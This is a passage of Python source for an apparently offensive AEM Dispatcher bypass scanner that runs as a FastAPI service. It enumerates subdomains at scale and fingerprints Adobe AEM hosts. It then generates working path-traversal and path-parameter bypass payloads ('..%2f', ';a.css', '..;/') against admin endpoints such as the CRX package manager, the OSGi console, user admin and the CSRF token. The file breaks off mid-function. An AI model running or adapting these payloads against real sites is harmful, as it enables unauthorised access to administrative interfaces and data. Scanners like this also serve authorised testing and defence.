#!/usr/bin/env python3
"""
AEM Dispatcher Bypass Scanner — FastAPI Web Backend
====================================================
Real-time WebSocket-driven scanner with 4-phase pipeline:
  1. Subdomain Enumeration (subfinder)
  2. Alive Host Check (ProjectDiscovery httpx)
  3. AEM Detection (multi-signal fingerprinting)
  4. Dispatcher Bypass Scan (8+1 bypass techniques, 46 endpoints)

API:
  POST /api/scan                — start a scan
  GET  /api/scan/{id}/status    — poll scan status
  WS   /ws/{id}                 — real-time updates
  GET  /api/scan/{id}/results   — final results
  GET  /                        — serve frontend HTML

ref: SL Cyber / infosec_au / Muhammad Waseem research
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import string
import subprocess
import sys
import threading
import time
import uuid
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import requests
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("aem-scanner")

# ============================================================================
# DEFAULTS
# ============================================================================
DEFAULT_THREADS = 100
DEFAULT_PER_HOST = 10
DEFAULT_TIMEOUT = 12
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
HEADERS = {"User-Agent": DEFAULT_UA, "Accept": "*/*"}

# ============================================================================
# AEM ENDPOINTS (46 targets)
# ============================================================================
AEM_ENDPOINTS: list[tuple[str, str]] = [
    # QueryBuilder / Search
    ("bin/querybuilder.json", "QueryBuilder JSON"),
    ("bin/querybuilder.json.servlet", "QueryBuilder Servlet"),
    ("bin/querybuilder.feed.servlet", "QueryBuilder Feed"),
    ("bin/wcm/search/gql.servlet.json", "GQL Search"),
    ("bin/gql/endpoints.json", "GQL Endpoints"),
    # CRX / Package Manager
    ("crx/packmgr/service.jsp", "CRX PackMgr Service"),
    ("crx/packmgr/service.jsp?cmd=ls", "CRX PackMgr List Pkgs"),
    ("crx/packmgr/index.jsp", "CRX PackMgr UI"),
    ("crx/de/index.jsp", "CRXDE Lite"),
    ("crx/explorer/browser/index.jsp", "CRX Browser"),
    ("crx/server/crx.default/jcr:root/.1.json", "JCR Root JSON"),
    # OSGi / System Console
    ("system/console", "OSGi Console"),
    ("system/console/bundles.json", "OSGi Bundles JSON"),
    ("system/console/configMgr", "OSGi ConfigMgr"),
    ("system/console/jmx", "JMX Console"),
    ("system/console/status-productinfo.txt", "Product Info"),
    ("system/health", "Health Check"),
    # Content / JCR
    ("content.json", "Content Root JSON"),
    ("content.infinity.json", "Content Infinity JSON"),
    ("content..4.json", "Content Depth-4 JSON"),
    ("content/dam.json", "DAM Root JSON"),
    ("content/dam.1.json", "DAM Depth-1 JSON"),
    ("content/dam.infinity.json", "DAM Infinity JSON"),
    ("content/usergenerated.json", "User Generated Content"),
    # Admin / UI Panels
    ("libs/granite/security/content/useradmin.html", "User Admin"),
    ("libs/granite/security/content/admin.html", "Granite Admin"),
    ("libs/granite/core/content/login.html", "Granite Login"),
    ("libs/cq/search/content/querydebug.html", "Query Debug"),
    ("libs/granite/omnisearch/content.html", "OmniSearch"),
    ("libs/wcm/core/content/siteadmin.html", "Site Admin"),
    ("libs/cq/core/content/welcome.html", "CQ Welcome"),
    ("libs/dam/gui/content/assets.html", "DAM Assets UI"),
    ("libs/cq/gui/content/dumplibs.html", "ClientLibs Dump"),
    # Config / Replication
    ("etc/packages.json", "Packages JSON"),
    ("etc/reports/diskusage.html", "Disk Usage"),
    ("etc/replication/agents.author.html", "Replication Author"),
    ("etc/replication/agents.publish.html", "Replication Publish"),
    ("etc/replication.html", "Replication Page"),
    ("etc/cloudservices.html", "Cloud Services"),
    # CSRF / Token Leaks
    ("libs/granite/csrf/token.json", "CSRF Token Leak"),
    # Misc
    ("admin", "AEM Admin"),
    ("start", "AEM Start"),
    ("mnt/overlay/content", "Overlay Content"),
    ("apps.json", "Apps JSON"),
    ("var/classes.json", "Var Classes JSON"),
    ("bin/wcm/domainmanager", "Domain Manager"),
]

# ============================================================================
# AEM BODY SIGNATURES (for genuine-response validation during bypass scan)
# ============================================================================
AEM_SIGNATURES: dict[str, list[str]] = {
    "QueryBuilder JSON": ['"hits"', '"success"', '"querybuilder"', '"results"'],
    "QueryBuilder Servlet": ['"hits"', '"success"', '"results"'],
    "QueryBuilder Feed": ["<feed", "<entry", "querybuilder"],
    "GQL Search": ['"hits"', '"results"', "gql"],
    "GQL Endpoints": ['"graphql"', '"endpoints"', '"name"', '"path"'],
    "CRX PackMgr Service": ["<crx:", "<packages", "packmgr", "crx/packmgr"],
    "CRX PackMgr List Pkgs": ["<crx:", "<packages", "<package"],
    "CRX PackMgr UI": ["CRX Package Manager", "crx/packmgr", "packagemgr"],
    "CRXDE Lite": ["CRXDE Lite", "crxde", "CRX DE"],
    "CRX Browser": ["CRX", "crx/explorer", "Repository Browser"],
    "JCR Root JSON": ['"jcr:primaryType"', '"rep:root"'],
    "OSGi Console": ["Apache Felix", "OSGi Framework", "felix"],
    "OSGi Bundles JSON": ['"symbolic-name"', '"Bundle-SymbolicName"', '"state"'],
    "OSGi ConfigMgr": ["Configuration Admin", "felix.cm", "configMgr", "OSGi"],
    "JMX Console": ["MBeanServer", "JMX", "Jolokia", "MBean"],
    "Product Info": ["Adobe Experience Manager", "CQ Version", "AEM"],
    "Health Check": ['"status"', '"checks"', "health"],
    "Content Root JSON": ['"jcr:primaryType"', '"cq:Page"', '"rep:root"'],
    "Content Infinity JSON": ['"jcr:primaryType"', '"jcr:content"'],
    "Content Depth-4 JSON": ['"jcr:primaryType"'],
    "DAM Root JSON": ['"jcr:primaryType"', '"dam:'],
    "DAM Depth-1 JSON": ['"jcr:primaryType"', '"dam:'],
    "DAM Infinity JSON": ['"jcr:primaryType"', '"dam:'],
    "User Generated Content": ['"jcr:primaryType"', "usergenerated"],
    "User Admin": ["User Administration", "useradmin", "Granite Security"],
    "Granite Admin": ["Granite Security", "useradmin"],
    "Granite Login": ["j_username", "j_password", "granite.login"],
    "Query Debug": ["Query Debug", "querydebug", "querybuilder"],
    "OmniSearch": ["omnisearch", "OmniSearch"],
    "Site Admin": ["Sites Admin", "siteadmin", "wcm/core"],
    "CQ Welcome": ["Adobe CQ", "Experience Manager", "CQ Welcome"],
    "DAM Assets UI": ["Digital Asset", "dam/gui", "Assets"],
    "ClientLibs Dump": ["clientlibs", "dumplibs", "categories"],
    "CSRF Token Leak": ['"token"', "granite.csrf", "CSRF"],
    "Packages JSON": ['"packages"', '"name"', '"version"', '"group"'],
    "Disk Usage": ["Disk Usage", "diskusage", "repository"],
    "Replication Author": ["Replication Agent", "transportUri", "author"],
    "Replication Publish": ["Replication Agent", "transportUri", "publish"],
    "Replication Page": ["Replication", "agents", "replication"],
    "Cloud Services": ["Cloud Services", "cloudservices"],
    "Overlay Content": ['"jcr:primaryType"', "overlay"],
    "Apps JSON": ['"jcr:primaryType"', '"sling:Folder"'],
    "Var Classes JSON": ['"jcr:primaryType"', "var/classes"],
    "Domain Manager": ["DomainManager", "domain manager"],
    "AEM Admin": ["Adobe Experience Manager", "Welcome to AEM"],
    "AEM Start": ["Adobe Experience Manager", "AEM"],
}

# ============================================================================
# AEM DETECTION — paths, headers, body sigs
# ============================================================================
AEM_DETECT_PATHS: list[tuple[str, str]] = [
    ("/libs/granite/core/content/login.html", "libs-login"),
    ("/content.json", "content-json"),
    ("/system/console", "osgi-console"),
    ("/crx/de/index.jsp", "crxde"),
    ("/bin/querybuilder.json", "querybuilder"),
    ("/content/dam.json", "dam-json"),
    ("/content/dam.ext.json", "dam-ext-json"),
    ("/content/dam.childrenlist.json", "dam-childrenlist"),
    ("/apps.json", "apps-json"),
    ("/etc.json", "etc-json"),
    ("/content/dam/www.json", "dam-www-json"),
]

AEM_DETECT_HEADERS: set[str] = {
    "x-dispatcher",
    "x-vhost",
    "x-aem-request-id",
    "x-aem-debug",
    "x-aem-uuid",
    "dispatcher",
}

AEM_BODY_SIGS_DETECT: list[str] = [
    "jcr:primaryType",
    "sling:resourceType",
    "cq:Page",
    "adobe experience manager",
    "j_username",
    "crxde lite",
    "apache felix",
    "cq.wcm.",
    '"dam:',
    "/etc.clientlibs/",
    "granite.ui.",
    "aem-clientlib",
]

# Source-code / HTML analysis patterns for Method A
HTML_ANALYSIS_PATTERNS: list[tuple[str, str]] = [
    # Strict AEM-specific patterns — avoid generic matches
    # /content/dam/ or /content/<project>/ with AEM path style (not just "/content/" anywhere)
    (r'(?:href|src|action)=["\'][^"\']*?/content/(?:dam|cq|we-retail|geometrixx|experience-fragments|campaigns|communities|screens|forms|projects|launches|catalogs)', "html:/content/ path"),
    (r'/etc\.clientlibs/', "html:/etc.clientlibs/ ref"),
    # jcr: must appear as an XML/HTML attribute (namespace:property), not in URLs or text
    (r'(?:jcr:primaryType|jcr:content|jcr:title|jcr:description|jcr:created|jcr:lastModified|jcr:uuid)', "html:jcr: attribute"),
    (r'class=["\'][^"\']*parsys', "html:parsys class"),
    # cq- must be in a CSS class attribute, not in URLs (avoids s_cid=acq- false positives)
    (r'class=["\'][^"\']*\bcq-', "html:cq- prefix class"),
]

# JavaScript console object patterns for Method E
JS_OBJECT_PATTERNS: list[tuple[str, str]] = [
    (r'CQ\.WCM', "js:CQ.WCM"),
    (r'CQ\.\w+', "js:CQ namespace"),
    (r'Sling\.servlet', "js:Sling.servlet"),
    (r'granite\.ui', "js:granite.ui"),
    (r'Granite\.', "js:Granite namespace"),
]

# Sample content paths for Method F
SAMPLE_CONTENT_PATHS: list[tuple[str, str]] = [
    ("/content/geometrixx/en.html", "sample:geometrixx"),
    ("/content/we-retail/us/en.html", "sample:we-retail-html"),
    ("/content/we-retail/us/en.json", "sample:we-retail-json"),
]

# ============================================================================
# WAF REJECTION SIGNATURES
# ============================================================================
WAF_REJECT_SIGS: list[str] = [
    "request rejected",
    "your support id is",
    "incapsula incident",
    "request unsuccessful. incap",
    "you have been blocked",
    "access to this resource on the server is denied",
    "this request has been blocked",
    "blocked by security policy",
    "web application firewall",
    "cloudflare ray id",
    "attention required! | cloudflare",
    "error 1006",
    "error 1010",
    "error 1015",
    "the requested url was rejected",
]

SOFT404_PROBES: list[str] = [
    "/aem-scan-probe-xyz123-notexist.json",
    "/probe-nonexistent-aem-abc987-check.html",
]

# ============================================================================
# BYPASS TECHNIQUES
# ============================================================================
BYPASS_TAGS: list[str] = [
    "nocanon",
    "nocanon-upper",
    "nocanon-2slash",
    "nocanon-2slash-up",
    "path-param",
    "hybrid",
    "dynmedia",
    "nocanon-3dot",
]


def build_bypass_paths(ep_path: str) -> list[tuple[str, str]]:
    """Build all 8 bypass URL variants for a given endpoint path."""
    if "?" in ep_path:
        base, qs = ep_path.split("?", 1)
        qs = "?" + qs
    else:
        base, qs = ep_path, ""

    return [
        ("nocanon", f"/graphql/execute.json/..%2f../{base}{qs}"),
        ("nocanon-upper", f"/graphql/execute.json/..%2F../{base}{qs}"),
        ("nocanon-2slash", f"//graphql/execute.json/..%2f../{base}{qs}"),
        ("nocanon-2slash-up", f"//graphql/execute.json/..%2F../{base}{qs}"),
        ("path-param", f"/{base};a.css{qs}"),
        ("hybrid", f"/{base};x=graphql/execute.json{qs}"),
        ("dynmedia", f"/adobe/dynamicmedia/deliver/..;/..;/..;/{base}{qs}"),
        ("nocanon-3dot", f"/graphql/execute.json/..%2f..%2f..%2f{base}{qs}"),
    ]


def build_ext_json_path(ep_path: str) -> tuple[str, str] | None:
    """Build the .ext.json selector bypass variant (technique #9)."""
    if "?" in ep_path:
        base, qs = ep_path.split("?", 1)
        qs = "?" + qs
    else:
        base, qs = ep_path, ""
    # Only applicable to paths without an existing .json extension
    if base.endswith(".json") or base.endswith(".html") or base.endswith(".jsp"):
        root = base.rsplit(".", 1)[0]
        return ("ext-json", f"/{root}.ext.json{qs}")
    return None


# ============================================================================
# SCAN STATE
# ============================================================================
class ScanPhase(str, Enum):
    SUBDOMAIN = "subdomain_enumeration"
    ALIVE = "alive_check"
    AEM_DETECT = "aem_detection"
    BYPASS = "bypass_scan"
    COMPLETE = "complete"
    ERROR = "error"


@dataclass
class ScanState:
    scan_id: str
    domain: str | None = None
    urls: list[str] = field(default_factory=list)
    phase: ScanPhase = ScanPhase.SUBDOMAIN
    status: str = "pending"
    started_at: float = 0.0
    finished_at: float = 0.0

    # Phase 1 results
    subdomains: list[str] = field(default_factory=list)
    # Phase 2 results
    alive_hosts: list[str] = field(default_factory=list)
    # Phase 3 results
    aem_hosts: dict[str, dict[str, Any]] = field(default_factory=dict)
    # Phase 4 results
    vulnerabilities: list[dict[str, Any]] = field(default_factory=list)
    vulnerability_summary: dict[str, Any] = field(default_factory=dict)

    # Settings
    threads: int = DEFAULT_THREADS
    per_host: int = DEFAULT_PER_HOST
    timeout: int = DEFAULT_TIMEOUT
    bypass_mode: str = "full"

    # WebSocket connections
    ws_connections: list[WebSocket] = field(default_factory=list)
    ws_lock: threading.Lock = field(default_factory=threading.Lock)

    # Cancel flag
    cancelled: bool = False

    # Message queue for async delivery
    _msg_queue: asyncio.Queue | None = None
    _loop: asyncio.AbstractEventLoop | None = None

    # Log history for late WebSocket connections
    _log_history: list[dict[str, Any]] = field(default_factory=list)
    _log_history_lock: threading.Lock = field(default_factory=threading.Lock)


# Global scan registry
scans: dict[str, ScanState] = {}
scans_lock = threading.Lock()


# ============================================================================
# WEBSOCKET MESSAGING
# ============================================================================
def _send_ws(scan: ScanState, msg: dict[str, Any]) -> None:
    """Queue a message for async WebSocket delivery and save to history."""
    # Save log messages to history for late WebSocket connections
    if msg.get("type") == "log":
        with scan._log_history_lock:
            scan._log_history.append(msg)
            # Cap at 2000 messages to prevent memory bloat
            if len(scan._log_history) > 2000:
                scan._log_history = scan._log_history[-1500:]
    if scan._loop and scan._msg_queue:
        try:
            scan._loop.call_soon_threadsafe(scan._msg_queue.put_nowait, msg)
        except Exception:
            pass


async def _ws_dispatcher(scan: ScanState) -> None:
    """Background task: drain the message queue and push to all WS clients."""
    while True:
        msg = await scan._msg_queue.get()
        if msg is None:
            break
        dead = []
        with scan.ws_lock:
            connections = list(scan.ws_connections)
        for ws in connections:
            try:
                await ws.send_json(msg)
            except Exception:
                dead.append(ws)
        if dead:
            with scan.ws_lock:
                for ws in dead:
                    if ws in scan.ws_connections:
                        scan.ws_connections.remove(ws)


# ============================================================================
# UTILITY
# ============================================================================
def normalize_url(url: str) -> str | None:
    url = url.strip().rstrip("/")
    if not url:
        return None
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url


def find_go_httpx() -> str | None:
    """Locate the ProjectDiscovery httpx binary."""
    candidates = [
        os.path.expanduser("~/.pdtm/go/bin/httpx"),
        os.path.expanduser("~/go/bin/httpx"),
        "/usr/local/bin/httpx",
        "/opt/homebrew/bin/httpx",
    ]

    def is_pd(p: str) -> bool:
        if not os.path.isfile(p):
            return False
        try:
            out = subprocess.run(
                [p, "-version"], capture_output=True, text=True, timeout=5
            )
            return "projectdiscovery" in (out.stdout + out.stderr).lower()
        except Exception:
            return False

    for p in candidates:
        if is_pd(p):
            return p
    try:
        for line in (
            subprocess.run(["which", "-a", "httpx"], capture_output=True, text=True)
            .stdout.strip()
            .split("\n")
        ):
            if line.strip() and is_pd(line.strip()):
                return line.strip()
    except Exception:
        pass
    return None


def is_waf_rejection(resp: requests.Response) -> bool:
    """Check if a 200 response is actually a WAF block page."""
    if len(resp.content) == 0:
        return False
    body_lower = resp.text.lower()
    return any(sig in body_lower for sig in WAF_REJECT_SIGS)


def get_soft404_baseline(base_url: str, timeout: int = DEFAULT_TIMEOUT) -> list[int]:
    """Probe random paths to detect catch-all servers. Returns baseline body sizes."""
    sizes = []
    for probe in SOFT404_PROBES:
        try:
            r = requests.get(
                base_url + probe,
                headers=HEADERS,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200:
                sizes.append(len(r.content))
        except Exception:
            pass
    return sizes if len(sizes) == len(SOFT404_PROBES) else []


def is_real_aem_response(
    resp: requests.Response, ep_label: str, soft404_sizes: list[int]
) -> bool:
    """Validate a 200 response is genuine AEM content, not a WAF page or soft-404."""
    # Layer 0: WAF rejection check
    if is_waf_rejection(resp):
        return False

    if not soft404_sizes:
        # Not a catch-all server — still check for AEM body signature
        sigs = AEM_SIGNATURES.get(ep_label)
        if sigs:
            body_lower = resp.text.lower()
            return any(sig.lower() in body_lower for sig in sigs)
        return True

    # Catch-all server: size must differ from baseline AND body must have AEM sig
    size = len(resp.content)
    for baseline in soft404_sizes:
        if abs(size - baseline) <= 200:
            return False

    sigs = AEM_SIGNATURES.get(ep_label)
    if sigs:
        body_lower = resp.text.lower()
        if not any(sig.lower() in body_lower for sig in sigs):
            return False

    return True


# ============================================================================
# PHASE 1: SUBDOMAIN ENUMERATION
# ============================================================================
def phase1_subdomains(scan: ScanState) -> None:
    """Run subfinder for subdomain enumeration."""
    _send_ws(scan, {
        "type": "phase",
        "phase": 1,
        "name": "Subdomain Enumeration",
        "status": "running",
    })
    scan.phase = ScanPhase.SUBDOMAIN

    if not scan.domain:
        _send_ws(scan, {
            "type": "phase",
            "phase": 1,
            "name": "Subdomain Enumeration",
            "status": "skipped",
            "message": "No domain provided, using direct URLs",
        })
        return

    log.info("Phase 1: Enumerating subdomains for %s", scan.domain)
    seen: set[str] = set()
    count = 0

    def _add_sub(sub: str, source: str = "") -> None:
        nonlocal count
        sub = sub.strip().lower().rstrip(".")
        if sub and sub not in seen and scan.domain in sub:
            seen.add(sub)
            count += 1
            scan.subdomains.append(sub)
            _send_ws(scan, {
                "type": "subdomain_found",
                "phase": 1,
                "subdomain": sub,
            })
            if count % 50 == 0:
                _send_ws(scan, {
                    "type": "progress",
                    "phase": 1,
                    "current": count,
                    "total": 0,
                    "message": f"Found {count} subdomains ({source})...",
                })

    # ── Helper: run a CLI tool and collect subdomains ──
    def _run_tool(cmd: list[str], tool_name: str, timeout_s: int = 180) -> None:
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"Running {tool_name} (max {timeout_s}s)..."})
            before = count
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

            # REAL timeout enforcement: kill process after timeout_s
            # The old code only called proc.wait(timeout=) AFTER stdout iteration,
            # which never fires if the process keeps its pipe open (amass on microsoft.com = 6hrs+)
            deadline = time.time() + timeout_s
            killed = False

            def _watchdog():
                nonlocal killed
                time.sleep(timeout_s)
                if proc.poll() is None:
                    killed = True
                    try:
                        proc.kill()
                    except Exception:
                        pass

            watcher = threading.Thread(target=_watchdog, daemon=True)
            watcher.start()

            for line in proc.stdout:
                if scan.cancelled:
                    proc.kill()
                    return
                if killed:
                    break
                _add_sub(line, tool_name)

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            added = count - before
            if killed:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"{tool_name}: timed out after {timeout_s}s, collected +{added} (total: {count})"})
            else:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"{tool_name}: +{added} new (total: {count})"})
        except FileNotFoundError:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"{tool_name}: not installed, skipping"})
        except Exception as e:
            log.warning("%s error: %s", tool_name, e)

    # ── Helper: run an HTTP API and collect subdomains ──
    def _run_api(url: str, api_name: str, parse_fn: callable) -> None:
        if scan.cancelled:
            return
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"Querying {api_name}..."})
            before = count
            r = requests.get(url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200 and r.content:
                for sub in parse_fn(r):
                    _add_sub(sub, api_name)
            _send_ws(scan, {"type": "log", "level": "info", "message": f"{api_name}: +{count - before} new (total: {count})"})
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"{api_name}: failed ({type(e).__name__})"})
            log.warning("%s error: %s", api_name, e)

    d = scan.domain

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 0: C99.nl Subdomain Finder (100K+ subdomains)
    # This is the single most comprehensive free subdomain source.
    # For microsoft.com it returns 100,000 subdomains — 20x more than
    # all other sources combined. Runs FIRST so subsequent sources
    # only add what C99 missed.
    # Streams the HTML response and extracts subdomains via regex
    # to avoid loading 79MB+ into memory.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        import re as _re_c99
        from datetime import date as _date, timedelta as _td
        try:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"Fetching C99.nl subdomain database (searching last 30 days)..."})
            log.info("SOURCE 0: Fetching C99.nl for %s (trying last 30 days)", d)
            c99_before = count
            c99_found = False

            # Try today first, then go back up to 30 days to find the latest scan
            # with ACTUAL subdomain data (some dates return 200 but empty results)
            pattern = _re_c99.compile(
                r"'([a-zA-Z0-9][a-zA-Z0-9._-]*\." + _re_c99.escape(d) + r")'"
            )

            for days_back in range(30):
                if scan.cancelled:
                    break
                check_date = (_date.today() - _td(days=days_back)).strftime("%Y-%m-%d")
                c99_url = f"https://subdomainfinder.c99.nl/scans/{check_date}/{d}"

                try:
                    c99_resp = requests.get(c99_url, timeout=30, stream=True,
                                             headers={"User-Agent": "Mozilla/5.0"})
                except requests.RequestException:
                    continue

                if c99_resp.status_code != 200:
                    c99_resp.close()
                    continue

                # Stream full page and extract subdomains
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"C99.nl: trying {check_date}..."})

                date_before = count
                leftover = ""
                chunk_count = 0
                for chunk in c99_resp.iter_content(chunk_size=131072, decode_unicode=True):
                    if scan.cancelled:
                        break
                    if chunk:
                        text = leftover + chunk
                        for match in pattern.findall(text):
                            _add_sub(match, "c99")
                        leftover = text[-300:] if len(text) > 300 else ""
                        chunk_count += 1
                        if chunk_count % 5 == 0:
                            _send_ws(scan, {"type": "log", "level": "info",
                                            "message": f"C99.nl: streaming {check_date}... +{count - c99_before} new so far..."})
                c99_resp.close()
                date_added = count - date_before

                if date_added > 0:
                    # Found real data — stop searching older dates
                    c99_added = count - c99_before
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"C99.nl ({check_date}): +{c99_added} subdomains found (total: {count})"})
                    log.info("SOURCE 0: C99.nl done, +%d new subdomains from %s", c99_added, check_date)
                    c99_found = True
                    break
                else:
                    # Empty result on this date — try older
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"C99.nl: {check_date} has 0 subdomains, trying older..."})
                    log.info("SOURCE 0: C99.nl %s empty for %s, trying older", check_date, d)

            if not c99_found and not scan.cancelled:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"C99.nl: no scan found in last 30 days for {d}"})
                log.info("SOURCE 0: C99.nl — no scan in last 30 days for %s", d)
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": f"C99.nl: failed ({type(e).__name__}: {e})"})
            log.warning("C99.nl error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 1: subfinder (passive — 25+ sources)
    # ══════════════════════════════════════════════════════════════════
    _run_tool(["subfinder", "-d", d, "-silent", "-all"], "subfinder")

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 2: assetfinder (passive — FB CT, certspotter, threatcrowd)
    # Often finds 10-15x more than subfinder alone
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_tool(["assetfinder", "--subs-only", d], "assetfinder", timeout_s=60)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 3: amass passive (60+ sources, ASN walking)
    # The most comprehensive passive tool — catches everything
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_tool(["amass", "enum", "-passive", "-norecursive", "-d", d], "amass", timeout_s=90)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 4: crt.sh PAGINATED (Certificate Transparency logs)
    # Single query on large domains (microsoft.com) times out.
    # Solution: crawl page by page with &offset=N
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": "Crawling crt.sh (Certificate Transparency) paginated..."})
            crt_before = count
            max_pages = 30   # 30 pages × ~100 certs = ~3000 certs (enough for most domains)
            empty_pages = 0
            for page in range(max_pages):
                if scan.cancelled or empty_pages >= 3:
                    break
                offset = page * 100
                try:
                    r = requests.get(
                        f"https://crt.sh/?q=%.{d}&output=json&offset={offset}",
                        timeout=20,
                        headers={"User-Agent": "Mozilla/5.0"},
                    )
                    if r.status_code != 200 or not r.content or r.content == b"[]":
                        empty_pages += 1
                        continue
                    entries = r.json()
                    if not entries:
                        empty_pages += 1
                        continue
                    empty_pages = 0
                    for entry in entries:
                        for name in entry.get("name_value", "").split("\n"):
                            name = name.strip().lstrip("*.")
                            if name and name.endswith(d):
                                _add_sub(name, "crt.sh")
                    if page % 10 == 0 and page > 0:
                        _send_ws(scan, {"type": "log", "level": "info",
                                        "message": f"crt.sh: page {page}/{max_pages}, +{count - crt_before} new so far..."})
                except requests.exceptions.Timeout:
                    _send_ws(scan, {"type": "log", "level": "info", "message": f"crt.sh: page {page} timed out, continuing..."})
                    continue
                except Exception:
                    empty_pages += 1
                    continue
            _send_ws(scan, {"type": "log", "level": "info", "message": f"crt.sh: +{count - crt_before} new (total: {count})"})
        except Exception as e:
            log.warning("crt.sh paginated error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 5: HackerTarget (free hostsearch API)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_api(
            f"https://api.hackertarget.com/hostsearch/?q={d}",
            "hackertarget",
            lambda r: [
                line.split(",")[0].strip()
                for line in r.text.strip().split("\n")
                if "," in line and line.split(",")[0].strip().endswith(d)
            ],
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 6: RapidDNS (free subdomain search)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        import re as _re
        _run_api(
            f"https://rapiddns.io/subdomain/{d}?full=1",
            "rapiddns",
            lambda r: list(set(_re.findall(r"([a-zA-Z0-9._-]+\." + _re.escape(d) + r")", r.text))),
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 7: JLDC (free API)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_api(
            f"https://jldc.me/anubis/subdomains/{d}",
            "jldc-anubis",
            lambda r: [s for s in r.json() if s.endswith(d)] if isinstance(r.json(), list) else [],
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 8: AlienVault OTX (threat intelligence)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_api(
            f"https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns",
            "alienvault-otx",
            lambda r: [
                e.get("hostname", "")
                for e in r.json().get("passive_dns", [])
                if e.get("hostname", "").endswith(d)
            ],
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 9: TLS certificate scanning (tlsfinder if available)
    # Connects to IPs and reads SAN from TLS certs — catches things
    # like quantum.microsoft.com that have dedicated certs
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        tlsfinder = os.path.expanduser("~/.pdtm/go/bin/tlsfinder")
        if os.path.isfile(tlsfinder):
            _run_tool([tlsfinder, "-d", d, "-silent"], "tlsfinder", timeout_s=60)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 10: DNS records (SPF, DMARC, MX → extract subdomains)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        import re as _re
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": "Checking DNS records (SPF/DMARC/MX)..."})
            before = count
            for qtype in ["TXT", "MX", "NS", "CNAME"]:
                try:
                    result = subprocess.run(
                        ["dig", qtype, d, "+short"], capture_output=True, text=True, timeout=10
                    )
                    for sub in _re.findall(r"([a-zA-Z0-9._-]+\." + _re.escape(d) + r")", result.stdout):
                        _add_sub(sub, f"dns-{qtype}")
                except Exception:
                    pass
            # SPF record may reference include:sub.domain.com
            try:
                result = subprocess.run(
                    ["dig", "TXT", d, "+short"], capture_output=True, text=True, timeout=10
                )
                for spf_include in _re.findall(r"include:([a-zA-Z0-9._-]+)", result.stdout):
                    if spf_include.endswith(d):
                        _add_sub(spf_include, "spf-include")
            except Exception:
                pass
            _send_ws(scan, {"type": "log", "level": "info", "message": f"DNS records: +{count - before} new"})
        except Exception:
            pass

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 11: TLS SAN extraction with tlsx
    # After finding subdomains, connect to each and read the cert's
    # Subject Alternative Names. Certs often list OTHER subdomains
    # that weren't discovered by passive sources.
    # This is how quantum.microsoft.com gets found — it has its own
    # cert with SAN: quantum.microsoft.com
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and scan.subdomains:
        tlsx_bin = os.path.expanduser("~/.pdtm/go/bin/tlsx")
        if os.path.isfile(tlsx_bin):
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"TLS SAN extraction: scanning {len(scan.subdomains)} hosts for cert SANs..."})
                tls_before = count
                tlsx_timeout = 90
                proc = subprocess.Popen(
                    [tlsx_bin, "-silent", "-san", "-cn", "-resp-only"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                )

                # Watchdog to kill tlsx if it hangs
                tlsx_killed = False
                def _tlsx_watchdog():
                    nonlocal tlsx_killed
                    time.sleep(tlsx_timeout)
                    if proc.poll() is None:
                        tlsx_killed = True
